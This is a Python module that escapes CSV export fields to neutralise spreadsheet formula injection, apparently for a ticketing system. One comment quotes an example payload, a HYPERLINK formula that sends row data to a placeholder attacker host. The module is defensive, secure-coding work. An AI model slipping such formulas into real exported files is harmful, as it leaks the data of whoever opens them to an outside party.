"""CSV field hardening (spec09 §6).

Pure and I/O-free, like the rest of `domain/`, so the escaping rule is
unit-testable without a database or an HTTP response.
"""

from datetime import datetime
from enum import Enum

#: A spreadsheet evaluates a cell beginning with any of these as a formula.
#: Every exported text field is customer-supplied, so every one is a vector:
#: `=HYPERLINK("http://attacker/"&A1,"Click")` in a ticket subject exfiltrates
#: the row to whoever opens the file.
INJECTION_PREFIXES = ("=", "+", "-", "@")

#: Leading tab/CR are stripped-then-evaluated by some spreadsheets, which would
#: slip a prefixed field past a naive check.
_LEADING_NOISE = "\t\r\n "


def escape_field(value: object) -> str:
    """Render one value for CSV, neutralising formula injection.

    A leading `'` is the conventional neutraliser: Excel and LibreOffice both
    treat the rest as literal text. `csv.writer` still handles quoting and
    embedded delimiters — this only covers what quoting does not.
    """
    if value is None:
        return ""
    if isinstance(value, Enum):
        # The member name, not `str(value)`, which would render "Priority.HIGH".
        return value.name
    if isinstance(value, datetime):
        return value.isoformat()
    if isinstance(value, bool):
        return "true" if value else "false"

    text = str(value)
    if text.lstrip(_LEADING_NOISE)[:1] in INJECTION_PREFIXES:
        return "'" + text
    return text
